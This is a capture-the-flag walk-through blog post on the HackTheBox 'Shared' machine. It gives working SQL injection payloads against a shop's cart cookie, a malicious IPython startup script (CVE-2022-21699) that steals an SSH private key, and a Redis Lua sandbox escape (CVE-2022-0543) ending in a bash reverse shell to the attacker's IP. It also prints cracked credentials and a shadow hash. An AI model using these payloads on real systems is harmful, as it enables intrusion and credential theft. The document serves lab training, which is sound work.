---
title: "Walk-through of Shared from HackTheBox"
header:
  teaser: /assets/images/2022-07-25-16-46-47.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - SQLi
  - JohnTheRipper
  - Pspy64
  - IPython
  - CVE-2022-21699
  - Redis
  - CVE-2022-0543
---

[Shared](https://www.hackthebox.com/home/machines/profile/483) is a medium level machine by [Nauten](https://www.hackthebox.com/home/users/profile/27582) on [HackTheBox](https://www.hackthebox.com/home). This Linux box explores using recent publicly disclosed vulnerabilities against a couple of well known applications.

<!--more-->

## Machine Information

![shared](/assets/images/2022-07-25-16-46-47.png)

On this box we start with a web shop which we find is vulnerable to SQLi union queries. From the database behind the site we get credentials for a user. Next we find an IPython vulnerability allows us to get credentials for another user via a recent CVE. As this second user we find a vulnerable version of redis is running locally on the box. We use another CVE to break out of the sandbox and execute code as root.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Shared](https://www.hackthebox.com/home/machines/profile/483) |
| Machine Release Date | 23rd July 2022 |
| Date I Completed It | 25th July 2022 |
| Distribution Used | Kali 2022.2 – [Release Info](https://www.kali.org/blog/kali-linux-2022-2-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.172 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~/htb/shared]
└─# nmap -p$ports -sC -sV -oA shared 10.10.11.172
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 16:49 BST
Nmap scan report for 10.10.11.172
Host is up (0.027s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.97 seconds
```

We see a redirect in the nmap scan to shared.htb, let's add that first:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# echo "10.10.11.172 shared.htb" >> /etc/hosts
```

## MyStore Website

Now we can go to the website. HTTP on port 80 redirects us to HTTPS on port 443. Accept the risk and continue to get to the site:

![shared-shop](/assets/images/2022-07-25-22-25-26.png)

We have a shop which is mostly functional. Wappalyzer reveals it's based on PrestaShop:

![shared-wappalyzer](/assets/images/2022-07-25-22-29-06.png)

We can add a shirt to our basket:

![shared-basket](/assets/images/2022-07-25-22-29-33.png)

When we proceed to checkout we see there is a different subdomain used:

![shared-checkout](/assets/images/2022-07-25-22-30-09.png)

Add the new subdomain to the hosts file:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# sed -i 's/shared.htb/shared.htb checkout.shared.htb/g' /etc/hosts
```

Refresh the checkout page and accept risks to get to your cart:

![shared-cart](/assets/images/2022-07-25-22-35-20.png)

After a little trial and error we find the product field is vulnerable to SQL injection.

## SQLi Union Based Attack

Use curl to look at the output:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# curl -i -s -k -X GET -b 'PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def50200f9b9055f20158b11921f6ddf2ee519e3170df1b868ca453f638a464eacf537f674a9b5b7572bfc5efeb62cf7a6e2bf0a5cf444de58b092e3d1f94f11e14e00fae64134f4fa62d578f2032ddfc1b1f85891bc9ba311b1db9d3f5deecb1b67f914a570a6ec0cf4cdd780dca318293cfb88c01cdc9b5b779978b09d1cc82a5cf02dc2b0b5e0231f6accd23ac739ceb6625fe5e705880245eeddb4a126481b07f3263c0f7cdf60b26de6a7bee4d155c114cadbdb796700ed9dbefac7e881f87a6e9e36d40e04fbea51a338fc5c07b405c9d05051e799f89cf352286f73ad08546ec9fdf4462d96dd1e5fb4962b4c70ea12dd3a323395190fe50fe52297b3605ed9934234971d865fa393f6cb0908a70aef3e107cfb; custom_cart=%7B%2253GG2EF8%22%3A%221%22%7D' 'https://checkout.shared.htb/' | grep -A1 '<th scope="row">1</th>'
                                                <th scope="row">1</th>
                                                <td>53GG2EF8</td>
```

The long Prestashop cookie can be left, the second custom_cart cookie holds the product code for the item we put in the basket back in the shop. It's URL encoded, let's decode to look at it:

```sh
└─# python3 -c "import urllib.parse; print(urllib.parse.unquote('%7B%2253GG2EF8%22%3A%221%22%7D'))"
{"53GG2EF8":"1"}
```

Knowing the format of the cookie we can use what we learnt on the TryHackMe room [SQHell](https://pencer.io/ctf/ctf-thm-sqhell) and play with it:

```sh
custom_cart={"53GG2EF8' and 1=2 union all select 1,2,3-- -":"1"}
```

Here we've used a union statement to find the number of fields. I started with **select 1**, then **select 1,2**. When I got to **select 1,2,3,4** we get an error so we know it's 3 fields.

Next we can confirm the field that will display our output:

```sh
custom_cart={\"53GG2EF8\' and 1=2 union select \'APPLE\',\'BANANA\',\'CARROT\'-- -\":\"1\"}
```

Send that with curl:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# curl -i -s -k -X $'GET' -b $'PrestaShop-5f7b4f27831ed69a<SNIP>3f6cb0908a70aef3e107cfb; custom_cart={\"53GG2EF8\' and 1=2 union select \'APPLE\',\'BANANA\',\'CARROT\'-- -\":\"1\"}' 'https://checkout.shared.htb/' | grep -A1 '<th scope="row">1</th>' | sed -n '/<td>/,$p' | tr -d "[:space:]" | sed 's/<td>//' | sed 's/<\/td>//'
BANANA
```

I've tidied up the output so it's easier to read. Now we can start gathering useful info from the database, first let's get it's name:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# curl -i -s -k -X $'GET' -b $'PrestaShop-5f7b4f27831ed69a<SNIP>3f6cb0908a70aef3e107cfb; custom_cart={\"53GG2EF8\' and 1=2 union select \'APPLE\',database(),\'CARROT\'-- -\":\"1\"}' 'https://checkout.shared.htb/' | grep -A1 '<th scope="row">1</th>' | sed -n '/<td>/,$p' | tr -d "[:space:]" | sed 's/<td>//' | sed 's/<\/td>//'
checkout
```

Now let's see the tables in the database:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# curl -i -s -k -X $'GET' -b $'PrestaShop-5f7b4f27831ed69a<SNIP>3f6cb0908a70aef3e107cfb; custom_cart={\"\' and 0=1 union select \'APPLE\',table_name,\'CARROT\' from information_schema.tables where table_schema=database()-- -\":\"1\"}' 'https://checkout.shared.htb/' | grep -A1 '<th scope="row">1</th>' | sed -n '/td>/,$p' | tr -d "[:space:]" | sed 's/<td>//' | sed 's/<\/td>//'
user
```

Next we get the column names from the user table:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# curl -i -s -k -X $'GET' -b $'PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def50200f9b9055f20158b11921f6ddf2ee519e3170df1b868ca453f638a464eacf537f674a9b5b7572bfc5efeb62cf7a6e2bf0a5cf444de58b092e3d1f94f11e14e00fae64134f4fa62d578f2032ddfc1b1f85891bc9ba311b1db9d3f5deecb1b67f914a570a6ec0cf4cdd780dca318293cfb88c01cdc9b5b779978b09d1cc82a5cf02dc2b0b5e0231f6accd23ac739ceb6625fe5e705880245eeddb4a126481b07f3263c0f7cdf60b26de6a7bee4d155c114cadbdb796700ed9dbefac7e881f87a6e9e36d40e04fbea51a338fc5c07b405c9d05051e799f89cf352286f73ad08546ec9fdf4462d96dd1e5fb4962b4c70ea12dd3a323395190fe50fe52297b3605ed9934234971d865fa393f6cb0908a70aef3e107cfb; custom_cart={\"\' and 0=1 union select \'APPLE\',group_concat(column_name),\'CARROT\' from information_schema.columns where table_schema=database() and table_name=\'user\'-- -\":\"1\"}' 'https://checkout.shared.htb/' | grep -A1 '<th scope="row">1</th>' | sed -n '/td>/,$p' | tr -d "[:space:]" | sed 's/<td>//' | sed 's/<\/td>//'
id,username,password
```

Now dump all users and passwords:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# curl -i -s -k -X $'GET' -b $'PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def50200f9b9055f20158b11921f6ddf2ee519e3170df1b868ca453f638a464eacf537f674a9b5b7572bfc5efeb62cf7a6e2bf0a5cf444de58b092e3d1f94f11e14e00fae64134f4fa62d578f2032ddfc1b1f85891bc9ba311b1db9d3f5deecb1b67f914a570a6ec0cf4cdd780dca318293cfb88c01cdc9b5b779978b09d1cc82a5cf02dc2b0b5e0231f6accd23ac739ceb6625fe5e705880245eeddb4a126481b07f3263c0f7cdf60b26de6a7bee4d155c114cadbdb796700ed9dbefac7e881f87a6e9e36d40e04fbea51a338fc5c07b405c9d05051e799f89cf352286f73ad08546ec9fdf4462d96dd1e5fb4962b4c70ea12dd3a323395190fe50fe52297b3605ed9934234971d865fa393f6cb0908a70aef3e107cfb; custom_cart={\"\' and 0=1 union select \'APPLE\',group_concat(username,password),\'CARROT\' from user-- -\":\"1\"}' 'https://checkout.shared.htb/' | grep -A1 '<th scope="row">1</th>' | sed -n '/td>/,$p' | tr -d "[:space:]" | sed 's/<td>//' | sed 's/<\/td>//'
james_masonfc895d4eddc2fc12f995e18c865cf273
```

## JohnTheRipper

Turns out there is only one. We have it's username and password hash. Let's crack the hash using JohnTheRipper:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# text="james_masonfc895d4eddc2fc12f995e18c865cf273" | echo "${text:0:11}:${text:11}" > james.hash

┌──(root㉿kali)-[~/htb/shared]
└─# john -wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 james.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Soleil101        (james_mason)     
1g 0:00:00:01 DONE (2022-07-26 22:29) 0.9090g/s 1900Kp/s 1900Kc/s 1900KC/s Sportster1..SoccerBabe
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

## SSH As User James

After only a few seconds we have a password. Now we can login:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# ssh james_mason@shared.htb
james_mason@shared.htbs password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$
```

Initial enumeration doesn't find a lot. I notice the user is a member of group 1001 called developer, and there's a folder owned by that group but it's empty:

```sh
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)

james_mason@shared:~$ find / -group developer 2>/dev/null
/opt/scripts_review

james_mason@shared:~$ ls -lsa /opt/scripts_review
4 drwxrwx--- 2 root developer 4096 Jul 14 13:46 .
4 drwxr-xr-x 3 root root      4096 Jul 14 13:46 ..
```

## Pspy64

Just like we have done many times before let's grab [pspy](https://github.com/DominicBreuker/pspy/releases) and have a look at running processes:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
--2022-07-26 22:35:39--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64       100%[======================================>]   2.94M  3.80MB/s    in 0.8s
2022-07-26 22:35:41 (3.80 MB/s) - ‘pspy64’ saved [3078592/3078592]

┌──(root㉿kali)-[~/htb/shared]
└─# scp pspy64 james_mason@shared.htb:~    
james_mason@shared.htbs password: 
pspy64     100% 3006KB   2.3MB/s   00:01
```

Back on the box let's run it:

```sh
james_mason@shared:~$ chmod +x pspy64 
james_mason@shared:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
Config: Printing events (colored=true): processes=true | file-system-events=false ||| 
Scannning for processes every 100ms and on inotify events ||| 
Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/07/26 17:40:05 CMD: UID=0    PID=8750   | /usr/bin/redis-server 127.0.0.1:6379                                            
<SNIP>
2022/07/26 17:41:01 CMD: UID=1001 PID=8793   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/07/26 17:41:01 CMD: UID=1001 PID=8794   | /usr/bin/pkill ipython 
2022/07/26 17:41:01 CMD: UID=1001 PID=8796   | /usr/bin/python3 /usr/local/bin/ipython 
<SNIP>
2022/07/26 17:42:01 CMD: UID=1001 PID=8815   | /usr/bin/pkill ipython 
2022/07/26 17:42:01 CMD: UID=1001 PID=8814   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/07/26 17:42:01 CMD: UID=1001 PID=8819   | /usr/bin/python3 /usr/local/bin/ipython 
```

We can see [Redis](https://redis.io/) is running on port 6379 as root. And also every minute a cron job runs as user ID 1001 which kills [ipython](https://ipython.org/), then changes in to the folder we saw before which is owned by James, and then runs ipython again.

Very suspicious, let's look at UID 1001:

```sh
james_mason@shared:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```

## IPython

We have another user called dan_smith responsible for killing ipython. Safe to assume that is something important so lets check it out:

```sh
james_mason@shared:~$ /usr/local/bin/ipython
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
Type 'copyright', 'credits' or 'license' for more information
IPython 8.0.0 -- An enhanced Interactive Python. Type '?' for help.
In [1]:
```

A search for **ipython 8 exploit** finds [this](https://snyk.io/vuln/pip:ipython@8.0.0) synk.io article, we leads us to a commit on GitHub [here](https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668) which gives us CVE-2022-21699. This took me to RedHat [here](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2022-21699) and finally on to the advisory on GitHub [here](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x) where we see an arbitrary code execution vulnerability.

## CVE-2022-21699

We can use this to execute commands as Dan when the cron job starts IPython from the current working directory that James owns by putting a script in the public_default/startup folder.

As per the advisory create the profile_default folder, and then startup folder inside it. Change permission to allow full access to everyone:

```sh
james_mason@shared:/opt/scripts_review$ mkdir /opt/scripts_review/profile_default /opt/scripts_review/profile_default/startup; chmod 777 /opt/scripts_review/profile_default /opt/scripts_review/profile_default/startup
```

Now we can create a Python script that will be run when IPython starts:

```sh
james_mason@shared:/opt/scripts_review$ echo "import os; os.system('cp /home/dan_smith/.ssh/id_rsa /dev/shm/id_rsa')" > /opt/scripts_review/profile_default/startup/pencer.py
```

Here we are just copying the SSH private key for Dan out to the /dev/shm folder. Check the script is there:

```sh
james_mason@shared:/opt/scripts_review$ ls profile_default/startup/
pencer.py

james_mason@shared:/opt/scripts_review$ ls profile_default/startup/
ls: cannot access 'profile_default/startup/': No such file or directory
```

It was there, then the cleanup script ran to remove my extra folders and file. However IPython has already been restarted so I have the id_rsa file:

```sh
james_mason@shared:/opt/scripts_review$ ls /dev/shm
id_rsa

james_mason@shared:/opt/scripts_review$ cat /dev/shm/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
<SNIP>
HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs
tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

## SSH As User Dan

Copy that to a file on Kali. Don't forget to chmod 600 it then log in as Dan and get the user flag:

```sh
┌──(root㉿kali)-[~/htb/shared]
└─# ssh -i id_rsa dan_smith@shared.htb 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4

dan_smith@shared:~$ cat user.txt 
63e742f18482b60b5faf64cc56b6cd34
```

If we look at our group membership we see we're in developer same as James, and also sysadmin. Let's see what those groups can access:

```sh
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)

dan_smith@shared:~$ find / -group developer 2>/dev/null
/opt/scripts_review

dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
```

## Redis

We saw earlier in pspy that Redis is running on the box. We can confirm it's accessible internally only:

```sh
dan_smith@shared:~$ netstat -punta | grep 6379
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -
```

Let's look at the binary we have access to:

```sh
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...
INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:13464
run_id:7965d680d06f2ad5fc6df355392e87ead01b635f
tcp_port:6379
uptime_in_seconds:38
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:14763217
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

The interesting things from this are:

1. Logs in to local Redis instance with a password
2. Shows its redis_version:6.0.15
3. Shows path to executable is /usr/bin/redis-server
4. Shows there's a config file /etc/redis/redis.conf

Checking files we see:

```sh
dan_smith@shared:~$ cat /etc/redis/redis.conf
cat: /etc/redis/redis.conf: Permission denied

dan_smith@shared:~$ /usr/bin/redis-server --version
Redis server v=6.0.15 sha=00000000:0 malloc=jemalloc-5.2.1 bits=64 build=4610f4c3acf7fb25
```

No access to the config file but confirms version running on server is same as this binary. A search for **redis 6.0.15 exploit** found [this](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md) which gives us CVE-2022-0543. We have a sandbox escape with remote code execution.

The screenshot shows to use redis-cli, which is on the box so we can try:

```sh
dan_smith@shared:/dev/shm$ redis-cli 
127.0.0.1:6379> help
redis-cli 6.0.15
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
(error) NOAUTH Authentication required.
```

## Redis_Connector_Dev Password

We need the password mentioned earlier before we can execute commands. Download the binary to Kali by first starting a web server on the box:

```sh
dan_smith@shared:/usr/local/bin$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Switch to Kali and pull the file across:

```sh
┌──(root㉿kali)-[~]
└─# wget http://shared.htb:1337/redis_connector_dev                
--2022-07-27 15:55:54--  http://shared.htb:1337/redis_connector_dev
Resolving shared.htb (shared.htb)... 10.10.11.172
Connecting to shared.htb (shared.htb)|10.10.11.172|:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5974154 (5.7M) [application/octet-stream]
Saving to: ‘redis_connector_dev’
redis_connector_dev  100%[===========>]   5.70M  3.98MB/s    in 1.4s    
2022-07-27 15:55:56 (3.98 MB/s) - ‘redis_connector_dev’ saved [5974154/5974154]
```

Start netcat listening on port 6379:

```sh
┌──(root㉿kali)-[~]
└─# nc -nlvp 6379
listening on [any] 6379 ...
```

In another terminal make the binary executable and then run it:

```sh
┌──(root㉿kali)-[~]
└─# chmod +x redis_connector_dev 

┌──(root㉿kali)-[~]
└─# ./redis_connector_dev
[+] Logging to redis instance using password...
INFO command result:
 i/o timeout
```

Back to netcat to see the password is revealed:

```sh
┌──(root㉿kali)-[~]
└─# nc -nlvp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49572
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

## CVE-2022-0543

Now back to the box and use that password to authenticate to redis using the cli tool:

```sh
dan_smith@shared:/usr/local/bin$ redis-cli --no-auth-warning --pass F2WHqJUz2WEz=Gqq
127.0.0.1:6379> 
```

Try the example given in the post again:

```sh
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=0(root) gid=0(root) groups=0(root)\n"
```

That works, let's get a reverse shell. Over to Kali and start netcat listening:

```sh
┌──(root㉿kali)-[~]
└─# nc -nlvp 1337               
listening on [any] 1337 ...
```

Back to the box and change our payload be a standard reverse shell using bash:

```sh
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.207/1337 0>&1\'", "r"); local res = f:read("*a"); f:close(); return res' 0
```

## Root Flag

Now back to Kali to see we're connected as root:

```sh
┌──(root㉿kali)-[~]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.172] 45326
id
uid=0(root) gid=0(root) groups=0(root)
```

Let's get the flag and root hash to complete the box:

```sh
cat /root/root.txt
1afb916af1f1a0832b739d76c38cccd7

cat /etc/shadow | grep root
root:$y$j9T$q/qYCzzDEBdZXpRxCa6gL/$XhNZBD56JUTsCniDDjj6UmwRnBc3A40AcbtqNzVEpJ4:19186:0:99999:7:::
```

That's another box completed. I hope you learnt something along the way. See you next time.
